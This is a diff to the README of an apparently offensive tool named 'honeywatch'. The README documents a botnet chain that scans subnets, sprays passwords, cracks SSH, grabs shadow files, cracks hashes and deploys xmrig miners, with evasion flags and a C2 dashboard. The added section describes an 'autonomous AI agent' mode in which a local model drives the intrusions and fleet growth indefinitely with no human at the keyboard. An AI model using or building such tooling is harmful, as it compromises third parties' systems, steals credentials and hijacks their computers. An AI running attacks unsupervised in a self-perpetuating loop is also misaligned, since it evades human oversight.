@@ -688,11 +688,49 @@ honeywatch botnet 10.0.0.0/24 \
   --hashcrack-wordlist rockyou.txt \
   --business-hours --proxy-file proxies.txt \
   --max-rounds 3 --skip-vpn-check
+
+# True daemon: run forever, pivoting until growth exhausts (no new subnets).
+honeywatch botnet 10.0.0.0/24 --pool ... --wallet ... --max-rounds 0 --skip-vpn-check
 ```
+
+`--max-rounds 0` is the unattended daemon mode — it loops until a pivot round
+finds no new subnets (growth exhausted), then stops. With a finite `--max-rounds`
+it caps the run.
 
 The chat agent gets the same power via the `run_chain` tool, so
 *"pop 10.0.0.0/24 and mine on everything you crack"* runs the whole chain.
 See [docs/opsec.md](docs/opsec.md) for the threat model behind each phase.
+
+### Autonomous AI agent (`honeywatch agent`)
+
+Where `botnet` is a *deterministic* fixed-phase chain, `agent` puts the Ollama
+model **in the driver's seat** — fully autonomous, no human at the keyboard.
+Each cycle the model observes the live fleet state (hosts, recovered
+credentials, operations), decides the highest-value next move, and emits it as
+tool calls (`scan`, `spray`, `crack_ssh`, `grab_shadow`, `hashcrack`, `deploy`,
+or a full `run_chain` pass). Results feed back and it loops — growing the fleet
+on its own until it signals `DONE` or exhausts productive moves. It reuses every
+existing agent tool, so the AI can drive the botnet at whatever granularity it
+judges best.
+
+```bash
+# Configure the model + wallet once (stores creds in the SQLite setup store):
+honeywatch setup
+
+# Then run it unattended — 20 decision cycles by default, log to a file so it
+# can run as a daemon with no terminal:
+honeywatch agent --goal "grow the xmrig fleet" \
+  --max-cycles 20 --cycle-delay 5 --business-hours \
+  --log /var/log/honeywatch-agent.log --skip-vpn-check
+
+# 0 = run forever until the model signals DONE (true unattended daemon):
+honeywatch agent --max-cycles 0 --log hw.log --skip-vpn-check --json
+```
+
+Knobs: `--goal`, `--max-cycles` (default 20; `0` = forever), `--cycle-delay`,
+`--business-hours` (sleeps off-hours instead of acting), `--log FILE`
+(append-only run log), `--db`, `--skip-vpn-check`, `--json`. The model, API
+key, and base URL come from `honeywatch setup` (or `$OLLAMA_API_KEY`).
 
 ### C2 controller / dashboard
 
